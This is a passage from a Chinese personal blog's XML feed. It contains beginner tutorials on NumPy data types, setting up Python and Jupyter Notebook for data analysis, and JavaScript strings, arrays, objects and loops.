align="center">无符号整型(取值范围为0~2^32-1)</td></tr><tr><td align="center">uint64</td><td align="center">无符号整型(取值范围为0~2^64-1)</td></tr><tr><td align="center">float16</td><td align="center">半精度浮点型：符号占用1bit，指数占用5bit，尾数占用10bit</td></tr><tr><td align="center">float32</td><td align="center">单精度浮点型：符号占用1bit，指数占用8bit，尾数占用23bit</td></tr><tr><td align="center">float64或者float</td><td align="center">双精度浮点型：符号占用1bit，指数占用11bit，尾数占用52bit</td></tr><tr><td align="center">complex64</td><td align="center">复数类型，由两个32位浮点型(实部和虚部)表示</td></tr><tr><td align="center">complex128或者complex</td><td align="center">复数类型，由两个64位浮点数(实部和虚部)表示</td></tr></tbody></table><p>备注：数据类型的名称以数字结尾，表示该类型的变量所占用的二进制位数</p><ul><li><ol><li><p>dtype指定数据类型</p><p>创建数组时，如果没有指定数组类型，numpy会给新建的数组一个合适的数据类型。当然，也可以给创建的数组指明数据类型，指明数据类型是通过参数dtype实现的</p></li><li><p>astype转换数据类型</p><p>astype()函数可以把数组元素转换成指定类型</p></li></ol></li></ul><p>注意：</p><ul><li>指定类型有两种写法。以float64为例：np.float64和”float64”，这两种方式效果相同</li><li>将浮点数转化成整数时元素的小数部分被截断，<strong>而不是四舍五入</strong></li><li>数值型的字符串可以通过astype方法将其转换为数值类型，但如果字符串中有非数值型进行转换就会报错</li><li>astype方法会创建一个新的数组，并不会改变原有数组的数据类型</li></ul><p>示例：astype()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.array([[<span class="hljs-number">1.1</span>,<span class="hljs-number">2.2</span>],[<span class="hljs-number">3.3</span>,<span class="hljs-number">3.4</span>]],dtype=np.<span class="hljs-built_in">float</span>)<br>b = a.astype(np.<span class="hljs-built_in">int</span>)<br>print(<span class="hljs-string">&#x27;a=&#x27;</span>,a)<br>print(<span class="hljs-string">&#x27;b=&#x27;</span>,b)<br>c = np.arange(<span class="hljs-number">5</span>,dtype=np.int8)<br>print(<span class="hljs-string">&#x27;c.dtype=&#x27;</span>,c.dtype)<br>print(<span class="hljs-string">&#x27;数据类型转换后的dtype=&#x27;</span>,c.astype(np.<span class="hljs-built_in">float</span>).dtype)<br>print(<span class="hljs-string">&#x27;c的数据类型没有改变，c.dtype=&#x27;</span>,c.dtype)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210527134251701.png"></p>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据分析(一)</title>
      <link href="/2021/05/24/python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E4%B8%80/"/>
      <url>/2021/05/24/python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="前排知识"><a href="#前排知识" class="headerlink" title="前排知识"></a>前排知识</h2><p>本文所有的实验都建立在Python环境上，所以一定要配置好环境。</p><p>做实验所需的工具：</p><ul><li>Pycharm</li><li>Jupyter Notebook</li><li>Anaconda</li></ul><p>Python数据分析环境的搭配包括Python的安装以及多个第三方库的安装。</p><p>先安装Python，再分别安装需要的第三方库。如果想省事，也可以直接安装Anaconda的方式简化安装。Anaconda包含了本章使用的所有的第三方库。使用Pycharm来运行Juypter并加载Anaconda所搭配的科学计算环境。</p><h3 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h3><p>本章默认读者已经具备Python基础，就不再赘述Python的安装。如果真的是小白，可以去查阅相关资料。</p><ul><li>Python基础：<a href="http://c.biancheng.net/python/">点我</a></li></ul><p><strong>注意：在安装python时，一定要同时安装pip，否则下边的安装都无法进行。</strong></p><h3 id="安装数据分析库"><a href="#安装数据分析库" class="headerlink" title="安装数据分析库"></a>安装数据分析库</h3><ol><li>安装第三方数据库</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip3 install numpy<br>pip3 install scipy<br>pip3 install matplotlib<br>pip3 install sklearn<br>pip3 install xlrd<br>pip3 install openpyxl<br>pip3 install seaborn<br></code></pre></td></tr></table></figure><ol start="2"><li>检查安装</li></ol><p>安装后，可以在python环境中使用导入检查是否安装成功(这里使用pycharm很方便)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> sklearn.datasets <span class="hljs-keyword">import</span> ds<br></code></pre></td></tr></table></figure><p>如果需要的类库没有安装，则会提示模块不存在，如果没有错误提示。则说明安装成功。</p><h3 id="Jupyter-Notebook的使用"><a href="#Jupyter-Notebook的使用" class="headerlink" title="Jupyter Notebook的使用"></a>Jupyter Notebook的使用</h3><p>Jupyter Notebook是IPython Notebook的继承者，是一个交互式笔记本，支持运行40多种编程语言。它本质上是一个支持实施 代码、数学方程、可视化和Markdown的Web应用程序。对于数据分析，Jupyter Notebook最大的优点是可以重现整个分析过程，并将说明文字、代码、图标、公式和结论都整合在一个文档中。用户可以通过电子邮件、Dropbox、Github和Jupyter Notebook Viewer将分析结果分享给其他人。</p><p>Jupyter Notebook是一个非常强大的工具，常用于交互式地开发和展示数据科学项目。它将代码和它的输出集成到一个文档中，并且结合了可视的叙述性文本、数学方程和其他丰富的媒体。它直观的工作流促进了迭代和快速开发，使得Jupyter Notebook在当代数据科学分析和越来越多的科学研究中越来越受欢迎。最重要的是，作为开源项目，它是完全免费的。</p><ol><li><p>安装Jupyter Notebook</p><ul><li>使用如下命令安装Jupyter Notebook</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip3 install jupyter<br></code></pre></td></tr></table></figure></li><li><p>启动Jupyter Notebook</p><ul><li>注意：Jupyter Notebook在启动后只允许访问启动目录中包含的文件（包括子目录中包含的文件），并且在Jupyter Notebook中创建的文件也保存在启动目录中，在启动Jupyter  Notebook之前需要修改当前目录。</li></ul><p>启动Jupyter Notebook之前先做准备工作。</p><ul><li><ol><li>创建目录（文件夹）。例如，在D盘下创建notebook文件夹</li><li>改变系统的当前目录，把当前目录更改为创建的目录（文件夹）。</li></ol></li></ul><p>准备工作完成后，开始启动Jupyter Notebook。在Windows系统下的命令行或者在Linux系统下的终端输入命令Jupyter notebook后按【Enter】键即可启动Jupyter Notebook。启动后会自动打开系统默认的浏览器，自动展示Jupyter Notebook的界面。正所谓无图无真相，接下来让我们看一下在Windows系统下，如何操作。</p><p>第一步，按【Win】+【R】启动运行，输入cmd打开命令行：</p></li></ol><p><img src="/images/JavaScript/image-20210524182937599.png"></p><p>​      第二步，切换到新创建的文件夹，输入Jupyter notebook，开始工作。</p><p><img src="/images/JavaScript/image-20210524183407917.png"></p><p>现在，可以看到新创建的文件夹下已经有文件存在了。因为我创建了之后改了个名，默认情况下文件名是Untitled。</p><p><img src="/images/JavaScript/image-20210524184334173.png"></p><p>启动后可以看到浏览器地址栏显示<a href="http://localhost:8888/tree%E3%80%82%E5%85%B6%E4%B8%AD%EF%BC%8Clocalhost%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E8%80%8C%E6%98%AF%E8%A1%A8%E7%A4%BA%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%B8%AD%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82Jupyter">http://localhost:8888/tree。其中，localhost不是一个网站，而是表示本地机器中服务的内容。Jupyter</a> Notebook是Web应用程序，它启动了一个本地的Python服务器，将这些应用程序（Jupyter）提供给Web浏览器，使其从根本上独立于平台，并具有Web上共享的优势。</p><ol start="3"><li><p>新建一个Notebook</p><ul><li>打开Jupyter Notebook以后会在系统默认的浏览器中出现Jupyter Notebook的界面（Home）。单击右上方的New下拉按钮，出现下拉列表，选择Python3选项，进入Python脚本编辑界面。</li></ul><p><img src="/images/JavaScript/image-20210524191439171.png"></p><ul><li>下拉列表中是创建的Notebook类型，其中，TextFile为纯文本型，Folder为文件夹，Python3表示Python运行脚本，灰色字体表示不可用项目。</li></ul></li><li><p>Jupyter Notebook界面</p><ul><li><p>Jupyter Notebook文档由一系列单元（cell）构成，单元有两种形式。</p><ul><li><ol><li>代码单元。代码单元是编写代码的地方，其左边有“In[]:”符号，编写代码后，单击界面上方工具栏中的“运行”按钮，执行程序，其结果会在对应代码单元的下方显示。</li><li>Markdown单元。Markdown单元对文本进行编辑，采用Markdown语法规范，可以设置文本格式、插入链接、图片甚至数学公式。Markdown也可以运行，运行后显示格式化的文本（原文本被替代）。</li></ol></li></ul><p><img src="/images/JavaScript/image-20210524200513291.png"></p></li></ul></li><li><p>Jupyter Notebook的两种模式</p><ul><li><ol><li>编辑模式。用于编辑文本和代码，对于Markdown单元，选中单元并按【Enter】键（或者双击）进入编辑模式；对于代码单元，选中单元后直接进入编辑模式。编辑模式的单元左侧显示绿色竖线。</li><li>命令模式。用于执行键盘输入的快捷命令，在编辑模式下通过按【Enter】键进入命令模式。命令模式的单元左侧显示蓝色竖线。</li></ol></li></ul></li><li><p>检查点</p><ul><li>当创建一个新的Notebook时，Jupyter Notebook都会创建一个检查点文件和一个Notebook文件；它将位于保存位置的隐藏子目录中，称作.ipynb_checkpoints，也是一个.ipynb文件。默认情况下，Jupyter将每隔120s自动保存Notebook，而不会改变Notebook文件。当“保存和检查点”时，Notebook和检查点文件都将被更新。因此，检查点能够在发生意外事件时恢复未保存的工作，通过菜单File-&gt;Revert to CheckPoints恢复到检查点。</li></ul></li><li><p>Markdown</p><ul><li>Markdown是一种轻量级、易于学习的、可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Jupyter Notebook的Markdown单元作为基础的Markdown的功能更加强大</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转JavaScript(二)</title>
      <link href="/2021/05/23/%E7%8E%A9%E8%BD%ACJavaScript-%E4%BA%8C/"/>
      <url>/2021/05/23/%E7%8E%A9%E8%BD%ACJavaScript-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="前排提示"><a href="#前排提示" class="headerlink" title="前排提示"></a>前排提示</h2><p>本节包含如下几个知识点：</p><ul><li>严格检查模式strict</li><li>字符串类型详解</li><li>数组类型详解</li><li>对象类型详解</li><li>分支和循环详解（流程控制）</li></ul><h2 id="卖个关子"><a href="#卖个关子" class="headerlink" title="卖个关子"></a>卖个关子</h2><p>在学习JavaScript的过程中，console.log()会频繁出现，如果你不懂它是什么，那么在学习、调试代码的时候就会走很多弯路。</p><p>console.log()是JavaScript中的一个内置函数，用于在控制台输出信息；该方法对于开发过程进行测试很有帮助。可以输出之前在其中定义的任何类型的变量，或者只输出需要显示给用户的任何消息。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(message);<br></code></pre></td></tr></table></figure><p>参数：它接受一个参数，该参数可以是数组、对象或任何消息。</p><p>返回值：返回给定参数的值。</p><p>下面通过示例来看看console.log()方法的使用</p><p>示例一：传递字符串作为参数</p><p>如果字符串传递给函数console.log()，那么该方法将显示它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> student = <span class="hljs-string">&#x27;student&#x27;</span>;<br><span class="hljs-built_in">console</span>.log(student);<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210523233602514.png"></p><p>示例2：传递文本消息作为参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;hello world&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210523233833575.png"></p><h3 id="神秘的console对象"><a href="#神秘的console对象" class="headerlink" title="神秘的console对象"></a>神秘的console对象</h3><p>Console对象用于Javascript调试。</p><p>Javascript原生中默认是没有Console对象的，这是宿主对象（也就是Browser）提供的内置对象。用于访问调试控制台，在不同的browser中效果可能不同。</p><p>console常见的两个用途是：</p><ul><li>显示网页代码运行时的错误信息</li><li>提供了一个命令行接口，用来与网页代码互动</li></ul><h2 id="发车了"><a href="#发车了" class="headerlink" title="发车了"></a>发车了</h2><h3 id="严格检查模式-strict"><a href="#严格检查模式-strict" class="headerlink" title="严格检查模式 strict"></a>严格检查模式 strict</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-comment">//严格检查模式，预防JavaScript的随意性导致产生的问题</span><br><span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><strong>局部变量建议都使用let去定义。</strong></p><p><strong>其中，’use strict’ 必须写在JavaScript的第一行。</strong></p><p><img src="/images/JavaScript/image-20210523223517418.png"></p><p>要确保idea对于Javascript的设置同上图所示，使用es6标准。</p><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><ol><li>正常字符串我们使用单引号，或者双引号包裹</li><li>注意转义字符 \</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">\&#x27;<br>\n<br>\t<br>\u4e2d  \\Unicode字符<br>\x41 \\ASCii字符<br></code></pre></td></tr></table></figure><ol start="3"><li>多行字符串编写</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br><span class="hljs-keyword">var</span> msg = <span class="hljs-string">`</span><br><span class="hljs-string">你好</span><br><span class="hljs-string">我叫胡雅宁</span><br><span class="hljs-string">是一个本科生</span><br><span class="hljs-string">`</span>;<br></code></pre></td></tr></table></figure><p>用Tab键上方英文状态下的``包裹住多行文字</p><ol start="4"><li>模板字符串</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br><span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;yaning&#x27;</span>;<br><span class="hljs-keyword">let</span> age = <span class="hljs-number">3</span>;<br><br><span class="hljs-keyword">let</span> msg = <span class="hljs-string">`你好呀，<span class="hljs-subst">$&#123;name&#125;</span>`</span>;<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210523231844338.png"></p><ol start="5"><li>字符串长度</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">str.length<br></code></pre></td></tr></table></figure><ol start="6"><li>字符串的可变性-不可变</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> student = <span class="hljs-string">&#x27;student&#x27;</span>;<br>student[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">console</span>.log(student);<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210523232540152.png"></p><ol start="7"><li><p>大小写转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//注意，这里是方法，不是属性了</span><br>student.toUpperCase()<br>student.toLowerCase()<br></code></pre></td></tr></table></figure></li><li><p>student.indexOf(‘t’)</p></li><li><p>substring</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[)<br>student.substring(<span class="hljs-number">1</span>)<span class="hljs-comment">//从第一个字符串到最后一个字符串</span><br>student.substring(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">//[1,3)</span><br></code></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3></li></ol><p>Array可以包含任意的数据类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><ol><li><p>长度</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr.length<br></code></pre></td></tr></table></figure><p>注意：假给arr.length赋值，数组大小就会发生变化，如果赋值过小，元素就会丢失。</p></li><li><p>indexOf，通过元素获得下标索引</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr.indexof(<span class="hljs-number">2</span>)<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>字符串的”1”和数字1是不同的</p></li><li><p><strong>slice()截取Array()的一部分，返回一个新数组。</strong></p></li><li><p>push、pop</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr.push(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<span class="hljs-comment">//压入到尾部</span><br>arr.pop()<span class="hljs-comment">//弹出尾部的一个元素</span><br></code></pre></td></tr></table></figure></li><li><p>unshift()、shift()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr.unshift(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<span class="hljs-comment">//在头部添加元素</span><br>arr.shift()<span class="hljs-comment">//弹出头部的元素</span><br></code></pre></td></tr></table></figure></li><li><p>排序sort()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>]<br>arr.sort()<br>[<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure></li><li><p>元素反转</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>]<br>arr.reverse()<br>[<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>]<br></code></pre></td></tr></table></figure></li><li><p>concat()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr.concat([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529192233452.png"></p><p>可见，concat()方法并不会把原数组干掉。只是会返回一个新的数组。</p></li><li><p>连接符join</p><p>打印拼接数组，使用特定的字符串连接</p><p><img src="/images/JavaScript/image-20210529192452519.png"></p><p>也不会改变原数组哦！</p></li><li><p>多维数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> arr = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]]<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529192820975.png"></p></li></ol><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>若干个键值对 = =。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person = &#123;<br>    name : <span class="hljs-string">&#x27;huyaning&#x27;</span>,<br>    age : <span class="hljs-number">20</span>,<br>    sex : <span class="hljs-string">&#x27;male&#x27;</span>,<br>    legion : <span class="hljs-string">&#x27;湖南&#x27;</span>,<br>    major : <span class="hljs-string">&#x27;数据科学与大数据技术&#x27;</span>,<br>    Ideal_university : <span class="hljs-string">&#x27;深圳大学&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>js对象中，{……}表示一个对象，键值对描述属性xxxx：xxxx，多个属性间用逗号隔开，最后一个属性不加逗号。</p><p><strong>Javascript中所有的键都是字符串，值是任意对象！</strong></p><ol><li><p>对象赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">person.name = <span class="hljs-string">&#x27;胡雅宁&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529195207027.png"></p></li><li><p>动态删减属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">delete</span> person.legion<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529195338460.png"></p></li><li><p>动态的添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">person.Ideal_university_high_level = <span class="hljs-string">&#x27;中山大学&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529195515759.png"></p></li><li><p>判断属性值是否在这个对象中</p><p>xxx in xxx</p><p><strong>Javascript中所有的键都是字符串，值是任意对象！</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;age&#x27;</span> <span class="hljs-keyword">in</span> person<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529195838008.png"></p></li></ol><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><ol><li>if判断</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> age = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span>(age&gt;<span class="hljs-number">3</span>)&#123;<br>    alert(<span class="hljs-string">&quot;i love you&quot;</span>)<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    alert(<span class="hljs-string">&#x27;i hate you&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>while循环,注意要避免程序死循环</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">while</span>(age &lt; <span class="hljs-number">70</span>)&#123;<br>    age = age + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">console</span>.log(age);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529200400211.png"></p><ol start="3"><li>for循环</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i =<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">20</span>;i++)&#123;<br>    <span class="hljs-built_in">console</span>.log(i);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529200724526.png"></p><ol start="4"><li>数组循环</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> age = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">18</span>,<span class="hljs-number">21</span>,<span class="hljs-number">32</span>,<span class="hljs-number">35</span>,<span class="hljs-number">47</span>]<br>age.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(value)<br>            &#125;)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529201126196.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> age = [<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>]<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> num <span class="hljs-keyword">in</span> age)&#123;<br>    <span class="hljs-keyword">if</span> (age.hasOwnProperty(num))&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;存在&#x27;</span>)<br>        <span class="hljs-built_in">console</span>.log(age[num])<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210529201733589.png"></p>]]></content>
      
      
      <categories>
          
          <category> 脚本语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> Java Web </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何利用Typora方便快捷地写博客</title>
      <link href="/2021/05/22/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Typora%E6%96%B9%E4%BE%BF%E5%BF%AB%E6%8D%B7%E5%9C%B0%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/05/22/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Typora%E6%96%B9%E4%BE%BF%E5%BF%AB%E6%8D%B7%E5%9C%B0%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
      
